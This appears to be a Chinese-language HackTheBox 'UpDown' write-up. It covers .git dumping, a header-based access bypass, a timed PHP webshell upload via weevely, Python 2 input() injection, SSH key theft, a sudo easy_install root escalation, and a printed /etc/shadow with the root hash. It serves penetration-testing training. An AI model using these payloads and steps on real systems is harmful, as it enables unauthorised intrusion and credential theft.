+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u &quot;http://10.129.227.227/dev&quot; -w  /Tools/Wordlists/SecLists/Discovery/Web-Content/quickhits.txt -d 1 </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021432-zapsc3v.png" alt="image">​</p>
+<p>發現這個目錄存在 <code>.git/HEAD</code>​，也就可以使用 <a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper">git_dumper </a>來下載整個目錄：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 git_dumper.py http://<span class="number">10.129</span><span class="number">.227</span><span class="number">.227</span>/dev git</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227042549-z4r762h.png" alt="image">​</p>
+<p>這樣會保存到 <code>git</code>​ 這個目錄。</p>
+<h2 id="Edit-http-header-to-digging-in-dev-siteisup-htb"><a href="#Edit-http-header-to-digging-in-dev-siteisup-htb" class="headerlink" title="Edit http header to digging in dev.siteisup.htb"></a>Edit http header to digging in dev.siteisup.htb</h2><p>進去看一下有什麽東西：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227042943-vwiiynz.png" alt="image">​</p>
+<p>有一個 <code>.htaccess</code>​ 文件，大概的解釋是這樣的：</p>
+<blockquote>
+<ol>
+<li><p><strong>SetEnvIfNoCase Special-Dev &quot;only4dev&quot; Required-Header</strong>:</p>
+<ul>
+<li>這行代碼會檢查請求中是否存在名為 <code>Special-Dev</code>​ 的標頭，並且其值是否為 <code>only4dev</code>​。如果條件滿足，則會設置一個環境變數 <code>Required-Header</code>​。</li>
+</ul>
+</li>
+<li><p><strong>Order Deny,Allow</strong>:</p>
+<ul>
+<li>這行代碼設置了訪問控制的順序，首先拒絕所有請求，然後再根據後面的規則允許某些請求。</li>
+</ul>
+</li>
+<li><p><strong>Deny from All</strong>:</p>
+<ul>
+<li>這行代碼拒絕所有來自任何來源的請求。</li>
+</ul>
+</li>
+<li><p><strong>Allow from env&#x3D;Required-Header</strong>:</p>
+<ul>
+<li>這行代碼允許那些滿足 <code>Required-Header</code>​ 環境變數的請求。也就是說，只有當請求中包含 <code>Special-Dev: only4dev</code>​ 標頭時，請求才會被允許。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>所以在不加請求頭的情況下，會出現403：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043121-f4ykwhq.png" alt="image">​</p>
+<p>如果加一行 <code>Special-Dev: only4dev</code>​，就會出現正常的内容：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043202-3ja04le.png" alt="image">​</p>
+<p>既然是這樣，去firebox商店安裝 <a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/header-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search">Header Editor</a>，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228030732-jq1x1bf.png" alt="image">​</p>
+<p>點擊增加，把上面的 header 加進去，這樣瀏覽器就會在每一個請求都加入 <code>Special-Dev: only4dev</code>​ 的 http 頭：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043327-zxsan01.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043335-l1t3a8k.png" alt="image">​</p>
+<p>保存之後並啓用，重新刷新就看到了這個界面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043351-u7qwq7a.png" alt="image">​</p>
+<p>觀察了一會，看起來是 git 下面的文件，所以分析一下源碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227045300-zyiqqpk.png" alt="image">​</p>
+<p>當上傳一個文件之後就會保存到 <code>uploads</code>​ 這個文件夾，如果使用瀏覽器打開後會出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227044822-1rks77f.png" alt="image">​</p>
+<p>但是默認的php服務器可以運行多種後綴名，這裏不一定是php，參考： <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227044609-u5r13yl.png" alt="image">​</p>
+<p>從上面的正則過濾中得到凡是有php的關鍵字都會被忽略掉，也就是說可以嘗試一下上面的 <code>Less known PHP extensions</code>​。</p>
+<h2 id="Try-to-upload-php-backdoor-with-less-known-extensions"><a href="#Try-to-upload-php-backdoor-with-less-known-extensions" class="headerlink" title="Try to upload php backdoor with less-known extensions"></a>Try to upload php backdoor with less-known extensions</h2><p>由於上面的源代碼中執行完成后會刪除原本的文件，所以就需要盡可能的讓他卡住，也就是盡可能的讓運行的時間邊長，</p>
+<p>當輸入一些域名的時候，系統會讓DNS解析成IP，由於機器無法聯網，所以會等待直到超時。</p>
+<p>默認的超時為5秒，可以使用 <code>man resolv.conf</code>​ 查看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032622-5zikuf3.png" alt="image">​</p>
+<p>這意味著可以在 php 木馬的尾部加入一些垃圾域名，一個域名卡5秒來延長執行時間：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">cat</span> mane.pht      </span><br><span class="line">&lt;?php                                                                                               </span><br><span class="line">                                                                                                    </span><br><span class="line">phpinfo();                                      </span><br><span class="line">                                                </span><br><span class="line">?&gt;                       </span><br><span class="line">                                                </span><br><span class="line">mane.asdasd.asdasd                              </span><br><span class="line">mane.asdasd.asdasd       </span><br><span class="line">mane.asdasd.asdasd                              </span><br><span class="line">asdadmane.asdasd.asdasd  </span><br><span class="line">mane.asdasd.asdasd                              </span><br><span class="line">mane.asdasd.asdasd    </span><br><span class="line">manesdiasidadasd.asdasd.asdasd                  </span><br><span class="line">mane.asdasd.asdasd       </span><br><span class="line">mane.asdasd.asdasd                              </span><br><span class="line">mane.asdasd.asdasd    </span><br><span class="line">mane.asdasd.asdasd   </span><br><span class="line">&lt;省略<span class="number">200</span>行&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032825-ls03dj8.png" alt="image">​</p>
+<p>儅上傳上去了之後，點擊check，他就會一直卡住：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032914-9wz13xa.png" alt="image">​</p>
+<p>這樣就有充足的時間打開 <code>http://dev.siteisup.htb/uploads/</code>​，然後執行木馬：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032932-meyqws0.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032940-ci2yglx.png" alt="image">​</p>
+<p>從源代碼中可以看到 <code>pht</code>​後綴失敗了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032949-50x3gtq.png" alt="image">​</p>
+<p>所以嘗試把 <code>pht</code>​ 改成 <code>phar</code>​ 試試看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228033143-n04053h.png" alt="image">​</p>
+<p>結果成功了的運行了 <code>phpinfo()</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228033148-niw8ktq.png" alt="image">​</p>
+<p>不過仔細一看，他禁止掉了一堆 php 運行外部函數的命令：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228033230-gminz77.png" alt="image">​</p>
+<p>比如常見的 <code>system,exec,shell_exec,popen</code>​ 都被禁止了。</p>
+<p>目前市面上有幾種自動繞過 php 的方法，第一種是使用 <a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>， 第二種是使用 weevely。</p>
+<p>由於第一種的大小已經超過了上傳限制，所以需要準備一個上傳文件的木馬然後把<a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>給上傳到目錄的機器上。</p>
+<h2 id="Upload-weevely-backdoor"><a href="#Upload-weevely-backdoor" class="headerlink" title="Upload weevely backdoor"></a>Upload weevely backdoor</h2><p>如果使用 weevely 則小很多，但是weevely不支持修改請求頭訪問。</p>
+<p>所以需要讓 weevely 連接到 burp ，讓burp自動修改 請求頭，這樣才可以正常的訪問木馬。</p>
+<h3 id="Burp-auto-change-proxy-header"><a href="#Burp-auto-change-proxy-header" class="headerlink" title="Burp auto change proxy header"></a>Burp auto change proxy header</h3><p>在burp中，點開設置：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050418-tzs1do8.png" alt="image">​</p>
+<p>然後在右邊的 <code>Replace</code>​加一行： <code>Special-Dev: only4dev</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050754-98gp3aw.png" alt="image">​</p>
+<p>點擊測試后如果出現 <code>Special-Dev: only4dev</code>​ 那就成功了，然後點擊 OK</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050804-vskx64z.png" alt="image">​</p>
+<p>確保有啓用，然後使用 curl 試一下 ：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">curl</span> <span class="literal">-x</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span> http://dev.siteisup.htb/</span><br></pre></td></tr></table></figure>
+
+<p>如果沒有出現 <code>403 Forbidden</code>​ 就説明成功了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050816-q4dex9s.png" alt="image">​</p>
+<h3 id="Change-proxychains-config-and-add-http-proxy"><a href="#Change-proxychains-config-and-add-http-proxy" class="headerlink" title="Change proxychains config and add http proxy"></a>Change proxychains config and add http proxy</h3><p>由於 weevely 沒有參數可以指定使用哪些代理，可以藉助 proxychains，所以需要修改proxychains的配置文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">http   127.0.0.1   8080</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050922-v21a26j.png" alt="image">​</p>
+<p>把burp的代理加入到最後，然後把其他代理刪掉，這樣就配置完成了。</p>
+<h3 id="Making-weevely-backdoor"><a href="#Making-weevely-backdoor" class="headerlink" title="Making weevely backdoor"></a>Making weevely backdoor</h3><p>使用這兩行可以快速生成 php 木馬：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> weevely generate mane mane.php <span class="literal">-obfuscator</span> cleartext1_php</span><br><span class="line"><span class="variable">$</span> <span class="built_in">mv</span> mane.php mane.phar </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228034321-pl5cma4.png" alt="image">​</p>
+<p>然後在木馬的尾部加一點垃圾域名用來拉長運行時間：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228034453-5cqdjag.png" alt="image">​</p>
+<p>上傳後得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227051449-l35lbrz.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227051510-x5379cj.png" alt="image">​</p>
+<p>然後複製該路徑，使用 weevely 鏈接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q weevely http://dev.siteisup.htb/uploads/46b2b5b52cb62015f534fadd1480c7ad/mane.phar mane </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227051225-q7gqwa2.png" alt="image">​</p>
+<p>可以看到它成功的運行了shell，由於會定時清理 <code>uploads</code>​ 這個目錄，所以需要在這裏獲得一個 reverse shell。</p>
+<p>‍</p>
+<h1 id="shell-as-webshell"><a href="#shell-as-webshell" class="headerlink" title="shell as webshell"></a>shell as webshell</h1><p>獲得了webshell之後，發現 <code>/home/developer</code>​有一個 suid 是 <code>siteisup</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227052729-6eaylsk.png" alt="image">​</p>
+<p>運行後，隨便打一些東西：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./siteisup</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054011-ap89f3b.png" alt="image">​</p>
+<p>看到他正在運行 <code>/home/developer/dev/siteisup_test.py</code>​，看一下裏面有什麽：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@updown:/home/developer/dev$ cat siteisup_test.py </span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = input(&quot;Enter URL here:&quot;)</span><br><span class="line">page = requests.get(url)</span><br><span class="line">if page.status_code == 200:</span><br><span class="line">        print &quot;Website is up&quot;</span><br><span class="line">else:</span><br><span class="line">        print &quot;Website is down&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一眼看下去確實沒有發現什麽問題，不過手動運行這個代碼之後，他是來自 python2 的報錯，因爲 python3 不會出現這種錯誤：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053801-tax0p6f.png" alt="image">​</p>
+<p>查了一下，總結如下：</p>
+<blockquote>
+<p>在 Python 2 中，<code>input()</code>​ 函数会将输入的内容作为 Python 表达式进行求值。这意味着如果你输入的内容不是一个有效的 Python 表达式，比如字符串（没有用引号包围），就会导致 <code>NameError</code>​，因为 Python 会试图将其作为变量名来查找。</p>
+<p>例如，当你输入 <code>mane</code>​ 时，Python 试图寻找一个名为 <code>mane</code>​ 的变量，但没有找到，因此抛出了 <code>NameError</code>​。</p>
+<p>如果你想要输入一个字符串，应该使用 <code>raw_input()</code>​ 函数。这样输入的内容会被视为字符串，而不是表达式。例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = raw_input(<span class="string">&quot;Enter URL here:&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样无论你输入什么，都会被正确处理为一个字符串。</p>
+</blockquote>
+<p>所以可以去查一下如何運行惡意命令：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053652-ifpclr0.png" alt="image">​</p>
+<p>然後看到這個： <a target="_blank" rel="noopener" href="https://cybersecurity.whitehatlabs.tech/real-world-and-and-ctf/scripts-and-systems/python2-input-vulnerability">https://cybersecurity.whitehatlabs.tech/real-world-and-and-ctf/scripts-and-systems/python2-input-vulnerability</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053847-6netyzu.png" alt="image">​</p>
+<p>也就是說只要輸入這堆payload，就可以運行命令，所以讓運行 bash 就可以得到一個shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./siteisup</span><br><span class="line">__import__(&quot;os&quot;).system(&quot;bash -p&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053937-7yah3tp.png" alt="image">​</p>
+<p>由於當前是<code>developer</code>​，在 嘗試讀取 <code>user.txt</code>​ 的時候失敗了，使用 suid 的後果是 uid 可以登錄，但是 gid 不會改變：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054515-20lyn26.png" alt="image">​</p>
+<p>不過可以讀取 <code>.ssh</code>​ 裏面的 <code>id_rsa</code>​，直接使用 <code>id_rsa</code>​ 換 SSH 登錄就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">developer@updown:/home/developer/.ssh$ ls</span><br><span class="line">developer@updown:/home/developer/.ssh$ cat id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054525-pxwodvn.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054618-5e0epo7.png" alt="image">​</p>
+<h2 id="Exploit-easy-install-with-sudo"><a href="#Exploit-easy-install-with-sudo" class="headerlink" title="Exploit easy_install with sudo"></a>Exploit easy_install with sudo</h2><p>看一下它可以執行什麽命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054044-m0heek2.png" alt="image">​</p>
+<p>首先去 gtfobin 查一下，發現：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/easy_install/">https://gtfobins.github.io/gtfobins/easy_install/</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054855-t3p181q.png" alt="image">​</p>
+<p>那就直接複製粘貼這段payload 就得到了 root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">sudo easy_install $TF</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054731-yyc5w6q.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054829-vjobzq8.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@updown:~# cat /etc/shadow</span><br><span class="line">root:$6$35UwqDmGM31K3z1O$EV0yHaLbvEqQ1YfxHOl4fMFHnR0O0Lo7RSnFGpYdfUwBmec0/5JWenL6GLivYgeka8Z4XyYW2UhWOV5UOdK0w.:19165:0:99999:7:::</span><br><span class="line">daemon:*:19158:0:99999:7:::</span><br><span class="line">bin:*:19158:0:99999:7:::</span><br><span class="line">sys:*:19158:0:99999:7:::</span><br><span class="line">sync:*:19158:0:99999:7:::</span><br><span class="line">games:*:19158:0:99999:7:::</span><br><span class="line">man:*:19158:0:99999:7:::</span><br><span class="line">lp:*:19158:0:99999:7:::</span><br><span class="line">mail:*:19158:0:99999:7:::</span><br><span class="line">news:*:19158:0:99999:7:::</span><br><span class="line">uucp:*:19158:0:99999:7:::</span><br><span class="line">proxy:*:19158:0:99999:7:::</span><br><span class="line">www-data:*:19158:0:99999:7:::</span><br><span class="line">backup:*:19158:0:99999:7:::</span><br><span class="line">list:*:19158:0:99999:7:::</span><br><span class="line">irc:*:19158:0:99999:7:::</span><br><span class="line">gnats:*:19158:0:99999:7:::</span><br><span class="line">nobody:*:19158:0:99999:7:::</span><br><span class="line">systemd-network:*:19158:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19158:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19158:0:99999:7:::</span><br><span class="line">messagebus:*:19158:0:99999:7:::</span><br><span class="line">syslog:*:19158:0:99999:7:::</span><br><span class="line">_apt:*:19158:0:99999:7:::</span><br><span class="line">tss:*:19158:0:99999:7:::</span><br><span class="line">uuidd:*:19158:0:99999:7:::</span><br><span class="line">tcpdump:*:19158:0:99999:7:::</span><br><span class="line">sshd:*:19158:0:99999:7:::</span><br><span class="line">landscape:*:19158:0:99999:7:::</span><br><span class="line">pollinate:*:19158:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:19165::::::</span><br><span class="line">lxd:!:19165::::::</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#x6d;&#97;&#110;&#x65;&#64;&#x6d;&#x61;&#x6e;&#101;&#115;&#x65;&#x63;&#46;&#99;&#111;&#109;">&#x6d;&#97;&#110;&#x65;&#64;&#x6d;&#x61;&#x6e;&#101;&#115;&#x65;&#x63;&#46;&#99;&#111;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#109;&#97;&#x6e;&#101;&#64;&#x6d;&#x61;&#110;&#101;&#x73;&#101;&#99;&#x2e;&#x63;&#111;&#109;">&#109;&#97;&#x6e;&#101;&#64;&#x6d;&#x61;&#110;&#101;&#x73;&#101;&#99;&#x2e;&#x63;&#111;&#109;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 完成 <code>INTRODUCTION TO ACADEMY</code> 這個模塊后可以解鎖更多的功能！</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&text=HackTheBox - Machine - UpDown"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&is_video=false&description=HackTheBox - Machine - UpDown"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - UpDown&body=Check out this article: https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
